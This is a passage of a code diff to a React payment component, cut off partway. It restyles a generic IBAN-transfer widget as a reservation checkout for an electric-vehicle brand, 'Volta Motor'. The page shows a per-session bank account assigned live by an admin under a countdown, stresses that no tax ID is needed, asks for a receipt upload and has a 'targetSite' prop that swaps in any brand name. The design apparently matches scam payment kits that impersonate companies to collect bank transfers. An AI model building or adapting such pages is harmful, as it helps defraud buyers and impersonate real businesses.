@@ -28,25 +28,27 @@ interface PaymentFlowProps {
 }
 
 export function PaymentFlow({
-  productTitle = 'Standart Sipariş',
+  productTitle = 'Volta Elektrikli Araç Rezervasyonu',
   defaultAmount,
   initialAmount,
   brandTitle,
   targetSite,
-  themeAccent = '#38bdf8',
+  themeAccent = '#dc2626',
   onDone,
 }: PaymentFlowProps) {
-  const effectiveBrandTitle = targetSite || brandTitle || 'Güvenli IBAN Ödeme Sistemi';
+  const effectiveBrandTitle = targetSite || brandTitle || 'Volta Motor';
   const effectiveAmount = initialAmount || defaultAmount || '24.990,00 TL';
   const [sessionId, setSessionId] = useState('');
   const [request, setRequest] = useState<PaymentRequest | null>(null);
   const [status, setStatus] = useState<PaymentStatus>('idle');
-  const [copied, setCopied] = useState(false);
+  const [copiedIban, setCopiedIban] = useState(false);
+  const [copiedRef, setCopiedRef] = useState(false);
+  const [paymentMethod, setPaymentMethod] = useState<'havale' | 'card'>('havale');
 
   // Form states
   const [userName, setUserName] = useState('');
   const [userPhone, setUserPhone] = useState('');
-  const [userEmail, setUserEmail] = useState('');
+  const [userCity, setUserCity] = useState('');
   const [phoneError, setPhoneError] = useState<string | null>(null);
 
   // Initialize and subscribe
@@ -58,7 +60,6 @@ export function PaymentFlow({
       const active = getRequestBySession(sid);
       if (active) {
         setRequest(active);
-        // Check if expired
         if (active.status === 'approved' && active.expires_at) {
           const isExp = new Date(active.expires_at).getTime() < Date.now();
           setStatus(isExp ? 'expired' : 'approved');
@@ -78,7 +79,6 @@ export function PaymentFlow({
   };
 
   const handlePhoneChange = (val: string) => {
-    // Only numbers
     const cleaned = val.replace(/\D/g, '');
     setUserPhone(cleaned);
     if (cleaned && !cleaned.startsWith('05') && !cleaned.startsWith('5')) {
@@ -103,7 +103,7 @@ export function PaymentFlow({
       session_id: sessionId,
       user_name: userName.trim(),
       user_phone: formattedPhone,
-      user_email: userEmail.trim() || undefined,
+      user_email: userCity ? `Teslimat Şehri: ${userCity.trim()}` : undefined,
       product_name: productTitle,
       amount: effectiveAmount,
     });
@@ -113,9 +113,15 @@ export function PaymentFlow({
   };
 
   const handleCopyIban = (iban: string) => {
-    navigator.clipboard.writeText(iban);
-    setCopied(true);
-    setTimeout(() => setCopied(false), 2000);
+    navigator.clipboard.writeText(iban.replace(/\s+/g, ''));
+    setCopiedIban(true);
+    setTimeout(() => setCopiedIban(false), 2000);
+  };
+
+  const handleCopyRef = (refCode: string) => {
+    navigator.clipboard.writeText(refCode);
+    setCopiedRef(true);
+    setTimeout(() => setCopiedRef(false), 2000);
   };
 
   const handleReceiptUploaded = (receipt: ReceiptData) => {
@@ -134,553 +140,444 @@ export function PaymentFlow({
     setStatus('idle');
     setUserName('');
     setUserPhone('');
-    setUserEmail('');
+    setUserCity('');
   };
 
+  const refCode = request?.id ? `VOLTA-${String(request.id).replace(/[^a-zA-Z0-9]/g, '').slice(-6).toUpperCase()}` : 'VOLTA-SIPARIS';
+
   return (
-    <div
-      style={{
-        maxWidth: '680px',
-        margin: '0 auto',
-        padding: '32px 24px',
-        background: 'var(--card-bg, #ffffff)',
-        border: '1px solid var(--card-border, #e2e8f0)',
-        borderRadius: '24px',
-        boxShadow: 'var(--card-shadow, 0 10px 30px rgba(0,0,0,0.06))',
-        color: 'var(--c-fg, #0f172a)',
-        transition: 'all 0.3s ease',
-      }}
-    >
-      {/* Brand Header */}
-      <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', borderBottom: '1px solid var(--c-border, #e2e8f0)', paddingBottom: '16px', marginBottom: '24px' }}>
-        <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
-          <div style={{ padding: '8px', borderRadius: '12px', background: 'var(--c-bg-subtle, #f1f5f9)', color: themeAccent, display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
-            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
-              <rect x="1" y="4" width="22" height="16" rx="2" ry="2" />
-              <line x1="1" y1="10" x2="23" y2="10" />
-            </svg>
+    <div className="w-full max-w-2xl mx-auto bg-white rounded-3xl border border-slate-200/90 shadow-xl shadow-slate-100/80 overflow-hidden text-slate-800">
+      {/* Top Header */}
+      <div className="bg-[#14212d] text-white p-5 sm:p-6 flex items-center justify-between border-b border-slate-800">
+        <div className="flex items-center gap-3">
+          <div className="w-10 h-10 rounded-xl bg-red-600 flex items-center justify-center text-white font-black text-xl shadow-md">
+            V
           </div>
           <div>
-            <h3 style={{ margin: 0, fontSize: '18px', fontWeight: 700 }}>{effectiveBrandTitle}</h3>
-            <p style={{ margin: 0, fontSize: '12px', color: 'var(--c-fg-muted, #64748b)' }}>
-              Ürün: <strong>{productTitle}</strong> · Tutar: <strong>{effectiveAmount}</strong>
-            </p>
+            <div className="text-xs text-red-400 font-bold uppercase tracking-wider">Güvenli Ödeme & Rezervasyon</div>
+            <h3 className="text-base sm:text-lg font-black text-white">{effectiveBrandTitle}</h3>
           </div>
         </div>
-        <div style={{ display: 'flex', alignItems: 'center', gap: '4px', fontSize: '11px', color: 'var(--c-fg-muted, #64748b)' }}>
-          <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
+        <div className="flex items-center gap-1.5 text-[11px] text-slate-300 bg-slate-800/80 px-3 py-1.5 rounded-full border border-slate-700">
+          <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#10b981" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
             <rect x="3" y="11" width="18" height="11" rx="2" ry="2" />
             <path d="M7 11V7a5 5 0 0 1 10 0v4" />
           </svg>
-          <span>256-Bit SSL</span>
+          <span className="font-semibold">256-Bit SSL Güvenli</span>
         </div>
       </div>
 
-      {/* STATE 1: IDLE */}
-      {status === 'idle' && (
-        <div style={{ textAlign: 'center', padding: '20px 0' }}>
-          <div
-            style={{
-              width: '72px',
-              height: '72px',
-              borderRadius: '50%',
-              background: 'var(--c-bg-subtle, #f1f5f9)',
-              display: 'flex',
-              alignItems: 'center',
-              justifyContent: 'center',
-              margin: '0 auto 16px auto',
-              color: themeAccent,
-            }}
+      {/* Order Summary Ribbon */}
+      <div className="bg-slate-50 px-5 sm:px-6 py-3.5 border-b border-slate-200 flex flex-wrap items-center justify-between gap-3 text-xs">
+        <div className="flex items-center gap-2">
+          <span className="text-slate-500 font-medium">Seçili Model / Ürün:</span>
+          <span className="font-bold text-slate-900">{productTitle}</span>
+        </div>
+        <div className="flex items-center gap-2">
+          <span className="text-slate-500 font-medium">Toplam Tutar:</span>
+          <span className="text-sm font-black text-red-600">{effectiveAmount}</span>
+        </div>
+      </div>
+
+      {/* Payment Method Selector Tabs (Doabys Style) */}
+      <div className="p-5 sm:p-6 pb-2">
+        <div className="grid grid-cols-2 gap-2 bg-slate-100 p-1.5 rounded-2xl border border-slate-200/80 mb-6">
+          <button
+            type="button"
+            onClick={() => setPaymentMethod('havale')}
+            className={`py-2.5 px-3 rounded-xl text-xs sm:text-sm font-bold flex items-center justify-center gap-2 transition-all ${
+              paymentMethod === 'havale'
+                ? 'bg-white text-slate-900 shadow-sm border border-slate-200'
+                : 'text-slate-500 hover:text-slate-800'
+            }`}
           >
-            <svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
-              <line x1="18" y1="20" x2="18" y2="10" />
-              <line x1="12" y1="20" x2="12" y2="4" />
-              <line x1="6" y1="20" x2="6" y2="14" />
-              <line x1="2" y1="20" x2="22" y2="20" />
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
+              <rect x="1" y="4" width="22" height="16" rx="2" ry="2" />
+              <line x1="1" y1="10" x2="23" y2="10" />
             </svg>
-          </div>
-          <h2 style={{ fontSize: '24px', fontWeight: 700, marginBottom: '8px' }}>
-            Havale & EFT ile Ödeme
-          </h2>
-          <p style={{ color: 'var(--c-fg-muted, #64748b)', fontSize: '14px', maxWidth: '440px', margin: '0 auto 24px auto', lineHeight: 1.6 }}>
-            Ödeme yapacağınız banka hesap bilgileri (IBAN) ve işlem süreniz yöneticimiz tarafından anlık olarak tanımlanacaktır.
-          </p>
+            <span>Havale / EFT / FAST</span>
+          </button>
 
           <button
-            onClick={handleStartRequest}
-            style={{
-              padding: '14px 28px',
-              borderRadius: '12px',
-              background: themeAccent === '#38bdf8' ? 'linear-gradient(135deg, #0284c7 0%, #2563eb 100%)' : themeAccent,
-              color: '#ffffff',
-              border: 'none',
-              fontSize: '15px',
-              fontWeight: 700,
-              cursor: 'pointer',
-              display: 'inline-flex',
-              alignItems: 'center',
-              gap: '8px',
-              boxShadow: '0 8px 20px rgba(0,0,0,0.12)',
-            }}
+            type="button"
+            onClick={() => setPaymentMethod('card')}
+            className={`py-2.5 px-3 rounded-xl text-xs sm:text-sm font-bold flex items-center justify-center gap-2 transition-all ${
+              paymentMethod === 'card'
+                ? 'bg-white text-slate-900 shadow-sm border border-slate-200'
+                : 'text-slate-500 hover:text-slate-800'
+            }`}
           >
-            <span>Ödeme Bilgisi Talep Et</span>
-            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
-              <line x1="5" y1="12" x2="19" y2="12" />
-              <polyline points="12 5 19 12 12 19" />
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
+              <rect x="2" y="5" width="20" height="14" rx="2" />
+              <line x1="2" y1="10" x2="22" y2="10" />
             </svg>
+            <span>Kredi / Banka Kartı</span>
           </button>
         </div>
-      )}
 
-      {/* STATE 2: FORM */}
-      {status === 'form' && (
-        <div>
-          <div style={{ marginBottom: '20px' }}>
-            <h2 style={{ fontSize: '20px', fontWeight: 700, margin: '0 0 6px 0' }}>Ödeme Talebi Oluştur</h2>
-            <p style={{ fontSize: '13px', color: 'var(--c-fg-muted, #64748b)', margin: 0 }}>
-              Yalnızca iletişim bilgilerinizi giriniz. Vergi numarası veya şirket bilgisi gerekmez.
+        {paymentMethod === 'card' && (
+          <div className="bg-slate-50 border border-slate-200 rounded-2xl p-5 mb-6 text-center">
+            <div className="w-12 h-12 bg-amber-50 text-amber-600 rounded-xl flex items-center justify-center mx-auto mb-3">
+              <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
+                <circle cx="12" cy="12" r="10" />
+                <line x1="12" y1="8" x2="12" y2="12" />
+                <line x1="12" y1="16" x2="12.01" y2="16" />
+              </svg>
+            </div>
+            <h4 className="font-bold text-slate-900 text-sm mb-1">Kart ile Online Tahsilat & Taksit</h4>
+            <p className="text-xs text-slate-600 max-w-md mx-auto mb-4 leading-relaxed">
+              Kredi kartı ile peşin veya 12 aya varan taksit seçenekleri için müşteri temsilcimiz üzerinden güvenli 3D Secure ödeme linki oluşturabilirsiniz.
             </p>
+            <a
+              href={`https://wa.me/905000000000?text=Merhaba,%20Volta%20${encodeURIComponent(productTitle)}%20i%C3%A7in%20kredi%20kart%C4%B1%20ile%20%C3%B6deme%20linki%20istiyorum`}
+              target="_blank"
+              rel="noopener noreferrer"
+              className="inline-flex items-center gap-2 bg-emerald-600 hover:bg-emerald-700 text-white text-xs font-bold px-4 py-2.5 rounded-xl transition shadow-md shadow-emerald-600/20"
+            >
+              <span>Kart Ödeme Linki Talep Et</span>
+              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
+                <polyline points="9 18 15 12 9 6" />
+              </svg>
+            </a>
           </div>
+        )}
+      </div>
 
-          <form onSubmit={handleSubmitForm} style={{ display: 'flex', flexDirection: 'column', gap: '16px' }}>
-            <div>
-              <label style={{ display: 'block', fontSize: '13px', fontWeight: 600, marginBottom: '6px' }}>
-                Ad Soyad <span style={{ color: '#ef4444' }}>*</span>
-              </label>
+      {/* Main Payment Content Container */}
+      <div className="p-5 sm:p-6 pt-0">
+        {/* STATE 1: IDLE */}
+        {status === 'idle' && (
+          <div className="text-center py-6 sm:py-8">
+            <div className="w-16 h-16 rounded-2xl bg-red-50 text-red-600 flex items-center justify-center mx-auto mb-4 border border-red-100 shadow-sm">
+              <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
+                <rect x="1" y="4" width="22" height="16" rx="2" ry="2" />
+                <line x1="1" y1="10" x2="23" y2="10" />
+              </svg>
+            </div>
+            <h3 className="text-xl sm:text-2xl font-black text-slate-900 mb-2">
+              Resmi Banka Havalesi / FAST ile Ödeme
+            </h3>
+            <p className="text-xs sm:text-sm text-slate-600 max-w-md mx-auto mb-6 leading-relaxed">
+              Ödeme yapacağınız resmi şirket banka hesap (IBAN) bilgileriniz ve sipariş referans kodunuz anında tanımlanacaktır.
+            </p>
+
+            <button
+              onClick={handleStartRequest}
+              className="inline-flex items-center justify-center gap-2 bg-red-600 hover:bg-red-700 text-white font-bold py-3.5 px-6 rounded-xl shadow-lg shadow-red-600/20 transition-all text-sm active:scale-98"
+            >
+              <span>Ödeme Bilgilerini Görüntüle</span>
+              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
+                <line x1="5" y1="12" x2="19" y2="12" />
+                <polyline points="12 5 19 12 12 19" />
+              </svg>
+            </button>
+          </div>
+        )}
+
+        {/* STATE 2: FORM (Clean, No Tax ID, Direct & Simple) */}
+        {status === 'form' && (
+          <div>
+            <div className="mb-5">
+              <h3 className="text-lg sm:text-xl font-black text-slate-900">İletişim & Rezervasyon Bilgileri</h3>
+              <p className="text-xs text-slate-500 mt-1">
+                Yalnızca iletişim bilgilerinizi giriniz. Şirket evrakı veya vergi numarası istenmez.
+              </p>
+            </div>
+
+            <form onSubmit={handleSubmitForm} className="space-y-4">
               <div>
+                <label className="block text-xs font-bold text-slate-700 mb-1.5">
+                  Ad Soyad <span className="text-red-500">*</span>
+                </label>
                 <input
                   type="text"
                   required
-                  placeholder="Ahmet Yılmaz"
+                  placeholder="Örn: Ahmet Yılmaz"
                   value={userName}
                   onChange={(e) => setUserName(e.target.value)}
-                  style={{
-                    width: '100%',
-                    padding: '11px 14px',
-                    borderRadius: '10px',
-                    border: '1px solid var(--c-border, #cbd5e1)',
-                    background: 'var(--c-bg-subtle, #f8fafc)',
-                    color: 'inherit',
-                    fontSize: '14px',
-                    outline: 'none',
-                    boxSizing: 'border-box',
-                  }}
+                  className="w-full px-4 py-3 rounded-xl border border-slate-300 bg-slate-50/50 text-slate-900 text-sm focus:bg-white focus:border-red-600 focus:ring-2 focus:ring-red-600/20 outline-none transition"
                 />
               </div>
-            </div>
 
-            <div>
-              <label style={{ display: 'block', fontSize: '13px', fontWeight: 600, marginBottom: '6px' }}>
-                Telefon Numarası (GSM) <span style={{ color: '#ef4444' }}>*</span>
-              </label>
               <div>
+                <label className="block text-xs font-bold text-slate-700 mb-1.5">
+                  GSM Telefon Numarası <span className="text-red-500">*</span>
+                </label>
                 <input
                   type="tel"
                   required
                   placeholder="05XXXXXXXXX"
                   value={userPhone}
                   onChange={(e) => handlePhoneChange(e.target.value)}
-                  style={{
-                    width: '100%',
-                    padding: '11px 14px',
-                    borderRadius: '10px',
-                    border: `1px solid ${phoneError ? '#ef4444' : 'var(--c-border, #cbd5e1)'}`,
-                    background: 'var(--c-bg-subtle, #f8fafc)',
-                    color: 'inherit',
-                    fontSize: '14px',
-                    outline: 'none',
-                    boxSizing: 'border-box',
-                  }}
+                  className={`w-full px-4 py-3 rounded-xl border ${
+                    phoneError ? 'border-red-500 bg-red-50/30' : 'border-slate-300 bg-slate-50/50'
+                  } text-slate-900 text-sm focus:bg-white focus:border-red-600 focus:ring-2 focus:ring-red-600/20 outline-none transition`}
+                />
+                {phoneError && (
+                  <p className="text-xs text-red-600 mt-1 font-semibold flex items-center gap-1">
+                    <span>⚠</span> {phoneError}
+                  </p>
+                )}
+              </div>
+
+              <div>
+                <label className="block text-xs font-bold text-slate-700 mb-1.5">
+                  Teslimat İli / İlçe <span className="text-slate-400 font-normal">(Opsiyonel)</span>
+                </label>
+                <input
+                  type="text"
+                  placeholder="Örn: İstanbul / Kadıköy"
+                  value={userCity}
+                  onChange={(e) => setUserCity(e.target.value)}
+                  className="w-full px-4 py-3 rounded-xl border border-slate-300 bg-slate-50/50 text-slate-900 text-sm focus:bg-white focus:border-red-600 focus:ring-2 focus:ring-red-600/20 outline-none transition"
                 />
               </div>
-              {phoneError && (
-                <div style={{ color: '#ef4444', fontSize: '12px', marginTop: '4px', display: 'flex', alignItems: 'center', gap: '4px' }}>
-                  <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="#ef4444" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
-                    <circle cx="12" cy="12" r="10" />
-                    <line x1="12" y1="8" x2="12" y2="12" />
-                    <line x1="12" y1="16" x2="12.01" y2="16" />
+
+              <div className="flex gap-3 pt-3">
+                <button
+                  type="button"
+                  onClick={() => setStatus('idle')}
+                  className="flex-1 py-3 px-4 rounded-xl border border-slate-300 text-slate-700 font-bold text-sm hover:bg-slate-50 transition"
+                >
+                  Geri
+                </button>
+                <button
+                  type="submit"
+                  className="flex-2 py-3 px-4 rounded-xl bg-red-600 hover:bg-red-700 text-white font-bold text-sm shadow-lg shadow-red-600/20 transition flex items-center justify-center gap-2"
+                >
+                  <span>IBAN Bilgilerini Getir</span>
+                  <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
+                    <line x1="5" y1="12" x2="19" y2="12" />
+                    <polyline points="12 5 19 12 12 19" />
                   </svg>
-                  <span>{phoneError}</span>
+                </button>
+              </div>
+            </form>
+          </div>
+        )}
+
+        {/* STATE 3: WAITING / VERIFYING */}
+        {status === 'waiting' && (
+          <div className="text-center py-8">
+            <div className="w-14 h-14 rounded-2xl bg-red-50 text-red-600 flex items-center justify-center mx-auto mb-4 border border-red-100 animate-pulse">
+              <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="animate-spin">
+                <path d="M21.5 2v6h-6M21.34 15.57a10 10 0 1 1-.57-8.38l5.67-5.67" />
+              </svg>
+            </div>
+            <h3 className="text-lg sm:text-xl font-black text-slate-900 mb-2">
+              Banka Bilgileri Hazırlanıyor
+            </h3>
+            <p className="text-xs sm:text-sm text-slate-600 max-w-md mx-auto mb-6 leading-relaxed">
+              Adınıza özel tahsilat hesap bilgileri ve 10 dakikalık işlem süreniz tanımlanıyor. Lütfen sayfayı kapatmayınız.
+            </p>
+
+            <div className="inline-flex items-center gap-2 px-4 py-2 rounded-full bg-slate-100 text-slate-700 text-xs font-semibold border border-slate-200">
+              <span className="w-2 h-2 rounded-full bg-emerald-500 animate-ping" />
+              <span>Canlı Onay Bekleniyor</span>
+            </div>
+
+            <div className="mt-6">
+              <button
+                onClick={handleReset}
+                className="text-xs text-slate-400 hover:text-slate-600 underline font-medium"
+              >
+                İptal Et ve Bilgileri Düzenle
+              </button>
+            </div>
+          </div>
+        )}
+
+        {/* STATE 4: APPROVED / ACTIVE PAYMENT DETAILS */}
+        {status === 'approved' && request && (
+          <div>
+            <div className="flex items-center justify-between flex-wrap gap-3 pb-4 mb-4 border-b border-slate-200">
+              <div>
+                <span className="inline-flex items-center gap-1.5 px-3 py-1 rounded-full bg-emerald-50 text-emerald-700 border border-emerald-200 text-xs font-bold">
+                  <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round">
+                    <polyline points="20 6 9 17 4 12" />
+                  </svg>
+                  <span>Ödeme Bilgileri Aktif</span>
+                </span>
+                <h3 className="text-lg sm:text-xl font-black text-slate-900 mt-1">Havale & EFT Bilgileri</h3>
+              </div>
+              {request.expires_at && (
+                <CountdownTimer
+                  expiresAt={request.expires_at}
+                  onExpire={() => setStatus('expired')}
+                />
+              )}
+            </div>
+
+            {/* Official Bank Details Card */}
+            <div className="bg-slate-50 border border-slate-200/90 rounded-2xl p-5 space-y-4">
+              <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
+                <div>
+                  <span className="text-[11px] font-bold text-slate-400 uppercase tracking-wider block">Banka</span>
+                  <strong className="text-slate-900 text-sm sm:text-base font-bold">{request.bank_name || 'Türkiye İş Bankası'}</strong>
+                </div>
+                <div>
+                  <span className="text-[11px] font-bold text-slate-400 uppercase tracking-wider block">Hesap Sahibi</span>
+                  <strong className="text-slate-900 text-sm sm:text-base font-bold">{request.account_holder || 'Volta Motor San. ve Tic. A.Ş.'}</strong>
+                </div>
+              </div>
+
+              {/* IBAN Box with Quick Copy */}
+              <div className="bg-white p-3.5 sm:p-4 rounded-xl border border-slate-200 flex items-center justify-between gap-2">
+                <div>
+                  <span className="text-[10px] font-bold text-slate-400 uppercase tracking-wider block">IBAN Numarası</span>
+                  <span className="font-mono font-bold text-slate-900 text-sm sm:text-base tracking-tight select-all">
+                    {request.iban || 'TR00 0000 0000 0000 0000 0000 00'}
+                  </span>
+                </div>
+                <button
+                  type="button"
+                  onClick={() => handleCopyIban(request.iban || '')}
+                  className={`px-3.5 py-2 rounded-lg text-xs font-bold transition flex items-center gap-1.5 shrink-0 ${
+                    copiedIban ? 'bg-emerald-600 text-white' : 'bg-red-600 hover:bg-red-700 text-white'
+                  }`}
+                >
+                  {copiedIban ? (
+                    <>
+                      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5">
+                        <polyline points="20 6 9 17 4 12" />
+                      </svg>
+                      <span>Kopyalandı</span>
+                    </>
+                  ) : (
+                    <>
+                      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
+                        <rect x="9" y="9" width="13" height="13" rx="2" ry="2" />
+                        <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+                      </svg>
+                      <span>Kopyala</span>
+                    </>
+                  )}
+                </button>
+              </div>
+
+              {/* Reference Code & Amount */}
+              <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
+                <div className="bg-white p-3 rounded-xl border border-slate-200 flex items-center justify-between">
+                  <div>
+                    <span className="text-[10px] font-bold text-slate-400 uppercase block">Açıklama / Referans Kodu</span>
+                    <span className="font-mono font-black text-slate-800 text-xs sm:text-sm">{refCode}</span>
+                  </div>
+                  <button
+                    type="button"
+                    onClick={() => handleCopyRef(refCode)}
+                    className="text-[11px] font-bold text-red-600 hover:text-red-700 underline"
+                  >
+                    {copiedRef ? 'Kopyalandı' : 'Kopyala'}
+                  </button>
+                </div>
+
+                <div className="bg-white p-3 rounded-xl border border-slate-200 flex items-center justify-between">
+                  <div>
+                    <span className="text-[10px] font-bold text-slate-400 uppercase block">Ödenecek Tutar</span>
+                    <span className="font-black text-emerald-600 text-base sm:text-lg">{request.amount}</span>
+                  </div>
+                </div>
+              </div>
+
+              {request.admin_note && (
+                <div className="bg-amber-50 border border-amber-200 text-amber-900 text-xs p-3 rounded-xl">
+                  <strong>Yetkili Notu:</strong> {request.admin_note}
                 </div>
               )}
             </div>
 
-            <div>
-              <label style={{ display: 'block', fontSize: '13px', fontWeight: 600, marginBottom: '6px' }}>
-                E-posta Adresi <span style={{ fontSize: '11px', color: 'var(--c-fg-muted, #94a3b8)' }}>(Opsiyonel)</span>
-              </label>
-              <div>
-                <input
-                  type="email"
-                  placeholder="ornek@mail.com"
-                  value={userEmail}
-                  onChange={(e) => setUserEmail(e.target.value)}
-                  style={{
-                    width: '100%',
-                    padding: '11px 14px',
-                    borderRadius: '10px',
-                    border: '1px solid var(--c-border, #cbd5e1)',
-                    background: 'var(--c-bg-subtle, #f8fafc)',
-                    color: 'inherit',
-                    fontSize: '14px',
-                    outline: 'none',
-                    boxSizing: 'border-box',
-                  }}
-                />
-              </div>
-            </div>
-
-            <div style={{ display: 'flex', gap: '10px', marginTop: '8px' }}>
-              <button
-                type="button"
-                onClick={() => setStatus('idle')}
-                style={{
-                  flex: 1,
-                  padding: '12px',
-                  borderRadius: '10px',
-                  border: '1px solid var(--c-border, #cbd5e1)',
-                  background: 'transparent',
-                  color: 'inherit',
-                  fontWeight: 600,
-                  cursor: 'pointer',
-                }}
-              >
-                Geri
-              </button>
-              <button
-                type="submit"
-                style={{
-                  flex: 2,
-                  padding: '12px',
-                  borderRadius: '10px',
-                  background: themeAccent === '#38bdf8' ? 'linear-gradient(135deg, #0284c7 0%, #2563eb 100%)' : themeAccent,
-                  color: '#fff',
-                  border: 'none',
-                  fontWeight: 700,
-                  cursor: 'pointer',
-                  display: 'flex',
-                  alignItems: 'center',
-                  justifyContent: 'center',
-                  gap: '6px',
-                }}
-              >
-                <span>Talebi Gönder</span>
-                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
-                  <line x1="5" y1="12" x2="19" y2="12" />
-                  <polyline points="12 5 19 12 12 19" />
-                </svg>
-              </button>
-            </div>
-          </form>
-        </div>
-      )}
-
-      {/* STATE 3: WAITING */}
-      {status === 'waiting' && (
-        <div style={{ textAlign: 'center', padding: '24px 12px' }}>
-          <div
-            style={{
-              width: '64px',
-              height: '64px',
-              borderRadius: '50%',
-              background: 'rgba(56, 189, 248, 0.1)',
-              display: 'flex',
-              alignItems: 'center',
-              justifyContent: 'center',
-              margin: '0 auto 16px auto',
-              color: '#0284c7',
-            }}
-          >
-            <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="animate-spin">
-              <circle cx="12" cy="12" r="10" />
-              <polyline points="12 6 12 12 14 14" />
-            </svg>
-          </div>
-          <h2 style={{ fontSize: '20px', fontWeight: 700, marginBottom: '8px' }}>
-            Ödeme Talebiniz Yöneticilerimize İletildi
-          </h2>
-          <p style={{ color: 'var(--c-fg-muted, #64748b)', fontSize: '14px', maxWidth: '440px', margin: '0 auto 20px auto', lineHeight: 1.6 }}>
-            Talebiniz inceleniyor. Yönetici tarafından onaylandığında bu ekranda IBAN bilgileri ve geri sayım süreniz otomatik olarak görüntülenecektir.
-          </p>
-          <div
-            style={{
-              display: 'inline-flex',
-              alignItems: 'center',
-              gap: '8px',
-              padding: '8px 16px',
-              borderRadius: '20px',
-              background: 'var(--c-bg-subtle, #f1f5f9)',
-              fontSize: '12px',
-              color: 'var(--c-fg-muted, #64748b)',
-            }}
-          >
-            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="animate-spin">
-              <path d="M21.5 2v6h-6M21.34 15.57a10 10 0 1 1-.57-8.38l5.67-5.67" />
-            </svg>
-            <span>Canlı Onay Bekleniyor (Sayfayı kapatmayınız)</span>
-          </div>
-
-          <div style={{ marginTop: '24px' }}>
-            <button
-              onClick={handleReset}
-              style={{
-                background: 'none',
-                border: 'none',
-                color: 'var(--c-fg-muted, #94a3b8)',
-                fontSize: '12px',
-                cursor: 'pointer',
-                textDecoration: 'underline',
-              }}
-            >
-              Talebi İptal Et ve Başa Dön
-            </button>
-          </div>
-        </div>
-      )}
-
-      {/* STATE 4: APPROVED */}
-      {status === 'approved' && request && (
-        <div>
-          <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '20px', flexWrap: 'wrap', gap: '12px' }}>
-            <div>
-              <span style={{ display: 'inline-flex', alignItems: 'center', gap: '6px', padding: '4px 10px', borderRadius: '6px', background: 'rgba(16, 185, 129, 0.15)', color: '#10b981', fontSize: '11px', fontWeight: 700, textTransform: 'uppercase' }}>
-                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round">
-                  <polyline points="20 6 9 17 4 12" />
-                </svg>
-                <span>Onaylandı</span>
-              </span>
-              <h2 style={{ fontSize: '22px', fontWeight: 700, margin: '6px 0 0 0' }}>Ödeme ve Transfer Bilgileri</h2>
-            </div>
-            {request.expires_at && (
-              <CountdownTimer
-                expiresAt={request.expires_at}
-                onExpire={() => setStatus('expired')}
+            {/* Step: Receipt Upload */}
+            <div className="mt-6 pt-5 border-t border-slate-200">
+              <h4 className="font-black text-slate-900 text-sm sm:text-base mb-1">Dekont / Fiş Yükleme</h4>
+              <p className="text-xs text-slate-500 mb-3">
+                Havale / FAST transferinizi tamamladıktan sonra banka dekontunuzu yükleyiniz.
+              </p>
+              <ReceiptUpload
+                requestId={request.id}
+                onUploadSuccess={handleReceiptUploaded}
               />
-            )}
-          </div>
-
-          {/* Details Box */}
-          <div
-            style={{
-              borderRadius: '16px',
-              border: '1px solid var(--c-border, #cbd5e1)',
-              background: 'var(--c-bg-subtle, #f8fafc)',
-              padding: '20px',
-              display: 'flex',
-              flexDirection: 'column',
-              gap: '14px',
-            }}
-          >
-            <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(180px, 1fr))', gap: '12px' }}>
-              <div>
-                <span style={{ fontSize: '11px', textTransform: 'uppercase', color: 'var(--c-fg-muted, #64748b)', fontWeight: 600 }}>Banka Adı</span>
